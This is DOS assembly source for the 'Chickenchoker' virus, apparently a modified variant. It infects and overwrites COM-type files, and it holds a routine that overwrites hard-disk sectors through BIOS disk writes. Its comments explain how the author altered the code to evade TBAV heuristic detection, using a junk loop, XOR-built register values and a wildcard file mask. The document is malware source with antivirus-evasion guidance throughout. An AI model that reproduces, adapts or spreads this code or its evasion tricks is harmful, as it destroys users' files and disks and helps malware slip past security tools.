;                       Chickenchoker Virus by HDKiller
;
;       Origianl Variant        127 bytes
;       Fixored up Variant      132 bytes
;
;
; This is a trivial variant of a basic sort, no encryption and a nasty payload
;
; Being HDKiller's first virus it wasnt a bad start, though I wouldnt have made
; it destructive.
;
; The original version of this virus raised 2 flags in TBAV FS, one for file
; access and one for com/exe search routine.  The S is defeated by changing the
; original *.com with a *.?om wich is functionally the same but will cause the
; the virus to attack .aom .bom .com etc... This makes the virus a little more
; unstable, bet hey it's trivial.  The F is caused by mov ah,40h and can be
; beaten any number of ways, I used a mov ah,00h then an xor ah, 40h.  Thats
; one of countless numbers of way to get 40h into ah.  TBAV was keying on the
; beginning of this virus to get it's determination that it's a trivial virus.
; By adding a few lines of code you effectively loose TBAV.
;
Code    Segment
        Assume CS:code,DS:code
        Org     100h

startvx proc    near

        mov     ah,4eh
;        mov     cx,0000h               ; Key point for TBAV
        mov     cx,0013h
lopht:                                  ; Quick and simple loop to confuse TBAV
        loop    lopht                   ; Now that didnt take much did it ??
        mov     dx,offset star_com
        int     21h

        mov     ah,3dh
        mov     al,02h
        mov     dx,9eh
        int     21h

        xchg    bx,ax

;        mov     ah,40h                 ; Sets off the F in TBAV
        xor     ah,ah                   ; One of many methods to get 40h into
        xor     ah,40h                  ; ah.  Be imaginative when you can :)
        mov     cx,offset endvx - offset startvx
        mov     dx,offset startvx
        int     21h

        mov     ah,3eh
        int     21h

        int     20h

szTitleName     db' Chickenchoker Virus by hdkiller has been activated'
;szTitleName     db' ChChickenchchoker Virus by hdkiller | SOK-3'

rip_hd:

        xor dx,dx
rip_hd1:
                mov cx,2
                mov ax,311h
                mov dl,80h
                mov bx,5000h
                mov es,bx
                int 13h
                jae rip_hd2
                xor ah,ah
                int 13h
                rip_hd2:
                inc dh
                cmp dh,4
                jb rip_hd1
                inc ch
                jmp rip_hd

startvx endp

;star_com:       db      "*.com",0      ; Sets off S in TBAV
star_com:       db      "*.?om",0       ; Sacrifice a little stability to loose
                                        ; the S flag

endvx   label   near

code    ends
        end     startvx
